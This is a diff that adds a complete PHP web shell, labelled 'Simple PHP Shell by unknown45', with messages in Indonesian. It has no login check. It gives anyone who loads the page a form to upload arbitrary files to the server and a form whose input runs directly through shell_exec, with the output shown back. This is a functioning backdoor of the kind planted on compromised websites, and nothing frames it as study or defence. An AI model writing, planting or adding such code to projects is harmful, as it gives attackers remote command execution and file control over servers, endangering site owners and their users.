@@ -1,0 +1,33 @@
+<?php
+// Simple PHP Shell by unknown45
+
+echo "<center><h2>Simple Shell</h2></center>";
+
+// 1. Upload File
+if (isset($_POST['upload'])) {
+    $nama = $_FILES['file']['name'];
+    $tmp = $_FILES['file']['tmp_name'];
+    if ($nama && move_uploaded_file($tmp, $nama)) {
+        echo "âœ… <b>$nama</b> berhasil diupload.<br>";
+    } else {
+        echo "âŒ Gagal upload.<br>";
+    }
+}
+echo '<form method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <input type="submit" name="upload" value="Upload">
+      </form><hr>';
+
+// 2. Eksekusi Perintah
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    echo "<b>$ $cmd</b><br><pre>";
+    $out = shell_exec($cmd);
+    echo htmlspecialchars($out ? $out : "Tidak ada output.");
+    echo "</pre>";
+}
+echo '<form method="post">
+        <input type="text" name="cmd" placeholder="ls -la" width="50">
+        <input type="submit" value="Execute">
+      </form>';
+?>
